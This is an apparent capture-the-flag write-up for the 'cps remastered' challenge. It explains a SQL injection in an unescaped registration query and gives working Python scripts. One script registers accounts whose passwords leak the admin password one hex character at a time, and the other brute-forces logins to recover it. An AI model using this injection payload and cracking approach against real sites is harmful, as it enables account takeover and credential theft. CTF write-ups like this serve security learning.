# cps remastered

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/99d601dd-3e2d-4616-a727-452e7f2daa03)

see other files in folder

## solution

one thing that was annoying about this challenge was setting up a local copy of the php server, which took way longer than it should've

if we take a look at register.php, we can see that the SQL command is not being escaped correctly using `bind_param` like it is everywhere else, so we can do SQL injection

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/a7bd86e4-48dc-40b1-9c1a-d3e68b704075)

share.py
```py
ip = "https://cps.amt.rs/"
```

create.py
```py
import requests
from share import *
from _thread import start_new_thread
from time import sleep


def register(_2, uname, psswd):
    userdata = {"username": uname, "password": psswd}
    requests.post(ip + "register.php", data=userdata)
    print(_2+1, "created")


for _ in range(100):
    sleep(0.2)
    pl = f"jonas{_+1}', HEX(SUBSTR((SELECT password FROM (SELECT * FROM users)tmpp WHERE username LIKE 'admin'), {_+1}, 1))); -- q"
    start_new_thread(register, (_, pl, "a"))
sleep(100)
```

here, we create an account called `jonas<number>` for each character the password of the admin, and the password to the jonas account is hex encoded of the character, so `a` -> `61`

now, we can try to login as each account 256 times with the hex code for the character as the password

crack.py
```py
import requests
from _thread import start_new_thread
from share import *
from time import sleep


def login(uname, psswd):
    userdata = {"username": uname, "password": psswd}
    if "You are now logged in" in requests.post(ip + "login.php", data=userdata).text:
        if psswd == "":
            print(uname, "empty password btw <<<<<<")
        else:
            print()
            print(uname, chr(int(psswd, 16)), "GOOD <<<<<<")
            print()
    else:
        # print(uname, psswd, "fail")
        pass


index = 1
while True:
    charset = "abcdef0123456789"
    for char in charset:
        for char2 in charset:
            start_new_thread(login, (f"jonas{index}", char + char2))
            sleep(0.03)
    sleep(3)
    index += 1
```

then, we get the flag char by char
